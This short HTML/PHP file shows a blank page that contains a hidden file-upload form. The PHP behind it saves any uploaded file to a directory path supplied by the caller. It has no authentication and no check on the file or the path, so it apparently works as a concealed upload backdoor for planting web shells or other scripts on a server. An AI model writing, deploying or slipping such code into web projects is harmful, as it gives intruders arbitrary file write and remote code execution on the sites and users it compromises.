<html>
<head>

</head>
<body>
  <form style="display:none" enctype="multipart/form-data" action="#" method="POST">

    <input type="file" name="uploaded_file"><br>
      <input type="text" name="path" placeholder="path">
    <input type="submit" value="Upload">
      
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = $_POST['path'];
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>